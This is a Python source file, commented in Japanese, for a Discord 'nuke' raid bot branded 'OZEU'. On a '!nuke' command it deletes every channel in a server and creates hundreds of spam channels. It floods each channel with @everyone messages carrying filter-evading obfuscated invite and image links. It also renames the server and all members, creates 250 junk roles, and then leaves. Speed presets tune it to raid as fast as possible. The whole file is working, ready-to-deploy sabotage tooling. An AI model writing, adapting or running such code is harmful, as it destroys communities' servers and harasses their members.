# ================= CONFIG =================
import os
import asyncio
import logging
from datetime import datetime
from typing import List
import threading
import discord
from discord.ext import commands
from flask import Flask, jsonify

# ------------------- 色々 -------------------
TOKEN = os.environ.get("DISCORD_TOKEN") # tokenは直でも可
PREFIX = "!"                            # !nukeの!を変えられる
INTENTS = discord.Intents.default()
INTENTS.guilds = True
INTENTS.messages = True
INTENTS.message_content = True
INTENTS.members = True

# --- メイン作業 ---
ROLE_BASE      = "ozeumember"   # ロール名ベース
ROLE_COUNT     = 250               # 作成数
CHANNEL_BASE   = "ozeu-nuke"    # チャンネル名ベース
CHANNEL_COUNT  = 499               # 作成数
REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeuozeu [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/yNx4Me2) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&) [︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567562863939726/GtZ9HYjbkAA9bPR.webp?ex=684f4334&is=684df1b4&hm=76921f9aff9c6f4b90feaf662c07ca2bb48257ef2bb7fdf39fb5a6df94740967&) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567672725340230/Gri2PLOboAI8ZRV.jpeg?ex=684f434e&is=684df1ce&hm=c28e7c872cdcb1420d8f565211714fa33bef522a879eca292c280439173a9ea2&) [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/NbBGFcf)"  # 送信メッセージ
REPEAT_COUNT   = 200               # メッセージ送信回数　↑メッセージ内容

# --- サブ作業 ---
CHANGE_NICKNAMES = True          # Trueならニックネーム変更
NICK_BASE        = "おぜう様万歳！" # ギルメン名
NEW_GUILD_NAME   = "おぜう植民地"   #ギルド名

# --- 速度プリセット ---
# 遅い / 普通 / 速い / 爆速
SPEED_LEVEL = "爆速"  # ←ここだけ変える

SPEED_PRESETS = {
    "遅い": {
        "DELETE_CHUNK_SIZE": 3,
        "DELETE_CHUNK_SLEEP": 0.2,
        "POST_DELETE_WAIT": 4.0,
        "CREATE_CHUNK_SIZE": 2,
        "CREATE_CHUNK_SLEEP": 0.3,
        "MSG_CHUNK_SIZE": 3,
        "MSG_INTER_CHUNK_SLEEP": 0,
        "MSG_INTER_ROUND_SLEEP": 0,
        "ROLE_SLEEP": 0.1,
        "NICK_CHUNK_SIZE": 6,
        "NICK_CHUNK_SLEEP": 0.25
    },
    "普通": {
        "DELETE_CHUNK_SIZE": 5,
        "DELETE_CHUNK_SLEEP": 0.1,
        "POST_DELETE_WAIT": 3.0,
        "CREATE_CHUNK_SIZE": 4,
        "CREATE_CHUNK_SLEEP": 0.2,
        "MSG_CHUNK_SIZE": 6,
        "MSG_INTER_CHUNK_SLEEP": 0.02,
        "MSG_INTER_ROUND_SLEEP": 0.05,
        "ROLE_SLEEP": 0.05,
        "NICK_CHUNK_SIZE": 8,
        "NICK_CHUNK_SLEEP": 0.15
    },
    "速い": {
        "DELETE_CHUNK_SIZE": 8,
        "DELETE_CHUNK_SLEEP": 0.08,
        "POST_DELETE_WAIT": 2.0,
        "CREATE_CHUNK_SIZE": 6,
        "CREATE_CHUNK_SLEEP": 0.12,
        "MSG_CHUNK_SIZE": 10,
        "MSG_INTER_CHUNK_SLEEP": 0.01,
        "MSG_INTER_ROUND_SLEEP": 0.02,
        "ROLE_SLEEP": 0.03,
        "NICK_CHUNK_SIZE": 12,
        "NICK_CHUNK_SLEEP": 0.12
    },
    "爆速": {
        "DELETE_CHUNK_SIZE": 100,
        "DELETE_CHUNK_SLEEP": 0.04,
        "POST_DELETE_WAIT": 1.0,
        "CREATE_CHUNK_SIZE": 100,
        "CREATE_CHUNK_SLEEP": 0.05,
        "MSG_CHUNK_SIZE": 499,
        "MSG_INTER_CHUNK_SLEEP": 0,
        "MSG_INTER_ROUND_SLEEP": 0,
        "ROLE_SLEEP": 0.01,
        "NICK_CHUNK_SIZE": 16,
        "NICK_CHUNK_SLEEP": 0.05
    }
}

# プリセット反映
preset = SPEED_PRESETS.get(SPEED_LEVEL, SPEED_PRESETS["普通"])
DELETE_CHUNK_SIZE      = preset["DELETE_CHUNK_SIZE"]
DELETE_CHUNK_SLEEP     = preset["DELETE_CHUNK_SLEEP"]
POST_DELETE_WAIT       = preset["POST_DELETE_WAIT"]
CREATE_CHUNK_SIZE      = preset["CREATE_CHUNK_SIZE"]
CREATE_CHUNK_SLEEP     = preset["CREATE_CHUNK_SLEEP"]
MSG_CHUNK_SIZE         = preset["MSG_CHUNK_SIZE"]
MSG_INTER_CHUNK_SLEEP  = preset["MSG_INTER_CHUNK_SLEEP"]
MSG_INTER_ROUND_SLEEP  = preset["MSG_INTER_ROUND_SLEEP"]
ROLE_SLEEP             = preset["ROLE_SLEEP"]
NICK_CHUNK_SIZE        = preset["NICK_CHUNK_SIZE"]
NICK_CHUNK_SLEEP       = preset["NICK_CHUNK_SLEEP"]

# ------------------- ログ & Bot -------------------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("fast-nuke")
bot = commands.Bot(command_prefix=PREFIX, intents=INTENTS)
app = Flask(__name__)

# Flask health check
@app.route("/", methods=["GET"])
def health():
    return {"status": "ok", "bot_ready": bot.is_ready(), "bot_user": str(bot.user) if bot.user else None}

def start_flask():
    port = int(os.environ.get("PORT", "8080"))
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# ==================== Helpers ====================
def chunk_list(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i+n]

async def safe_delete_channel(channel: discord.abc.GuildChannel):
    try:
        await channel.delete()
        logger.info(f"Deleted: {channel.name} ({channel.id})")
    except Exception as e:
        logger.warning(f"Delete failed {channel}: {e}")

async def safe_create_channel(guild: discord.Guild, name: str):
    try:
        ch = await guild.create_text_channel(name)
        logger.info(f"Created channel: {name} ({ch.id})")
        await asyncio.sleep(0.1)
        return ch
    except Exception as e:
        logger.warning(f"Create failed {name}: {e}")
        return None

async def safe_send(ch: discord.TextChannel, content: str):
    try:
        await ch.send(content[:2000])
    except Exception as e:
        logger.warning(f"Send failed {ch}: {e}")

async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, repeat: int):
    for _ in range(repeat):
        for i in range(0, len(channels), MSG_CHUNK_SIZE):
            chunk = channels[i:i+MSG_CHUNK_SIZE]
            await asyncio.gather(*(safe_send(c, msg) for c in chunk))
            await asyncio.sleep(MSG_INTER_CHUNK_SLEEP)
        await asyncio.sleep(MSG_INTER_ROUND_SLEEP)

async def safe_change_nick(member: discord.Member, new_nick: str):
    try:
        await member.edit(nick=new_nick)
        return True
    except Exception:
        return False

async def change_all_nicknames(guild: discord.Guild):
    if not CHANGE_NICKNAMES:
        return 0
    members = [m for m in guild.members if not m.bot]
    changed = 0
    tasks = [(m, f"{NICK_BASE}-{i+1}") for i, m in enumerate(members)]
    for group in chunk_list(tasks, NICK_CHUNK_SIZE):
        coros = [safe_change_nick(m, nick) for m, nick in group]
        results = await asyncio.gather(*coros)
        changed += sum(1 for r in results if r)
        await asyncio.sleep(NICK_CHUNK_SLEEP)
    return changed

def bot_has_permissions(guild: discord.Guild):
    me = guild.me
    if me is None:
        return False
    perms = me.guild_permissions
    return perms.manage_channels and perms.manage_roles and perms.send_messages and perms.manage_nicknames

# ==================== Command ====================
@bot.command(name="nuke") # ここで文言変えれる　ozeuとかの方がかぶらなくていいかもね
async def nuke(ctx):
    guild = ctx.guild
    if not bot_has_permissions(guild):
        await ctx.send("Botに必要な権限がありません") # adminが付いてなければこれ返す　ゆるくしもいいんじゃない？(適当)
        return

    # バックアップチャンネル作成　バックアップじゃなくて、ログ進行定期
    backup_name = f"nuke-backup-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}"
    backup_channel = await guild.create_text_channel(backup_name)
    await backup_channel.send("⚙️ nuke開始")

    # メイン作業とサブ作業の並列実行
    async def main_tasks():
        # チャンネル削除
        channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
        for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
            await asyncio.gather(*(safe_delete_channel(c) for c in group))
            await asyncio.sleep(DELETE_CHUNK_SLEEP)
        await asyncio.sleep(POST_DELETE_WAIT)

        # チャンネル作成
        created_channels = []
        names = [f"{CHANNEL_BASE}-{i+1}" for i in range(CHANNEL_COUNT)]
        for group in chunk_list(names, CREATE_CHUNK_SIZE):
            results = await asyncio.gather(*(safe_create_channel(guild, n) for n in group))
            created_channels.extend([c for c in results if c])
            await asyncio.sleep(CREATE_CHUNK_SLEEP)

        # メッセージ送信
        await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)

    async def sub_tasks():
        # サーバ名変更
        if NEW_GUILD_NAME:
            try:
                await guild.edit(name=NEW_GUILD_NAME)
            except Exception as e:
                logger.warning(f"Guild rename failed: {e}")
        # ロール作成
        for i in range(1, ROLE_COUNT+1):
            await guild.create_role(name=f"{ROLE_BASE}-{i}", permissions=discord.Permissions.none())
            await asyncio.sleep(ROLE_SLEEP)
        # ニックネーム変更
        await change_all_nicknames(guild)

    # 並列実行
    await asyncio.gather(main_tasks(), sub_tasks())

    await backup_channel.send("✅ nuke完了。Botはサーバーを退出します")
    await asyncio.sleep(1.0)
    try:
        await guild.leave()
    except Exception as e:
        logger.warning(f"Guild leave failed: {e}")

# ==================== Entrypoint ====================
if __name__ == "__main__":
    threading.Thread(target=start_flask, daemon=True).start()
    if not TOKEN:
        raise SystemExit("DISCORD_TOKENが必要です")
    bot.run(TOKEN)
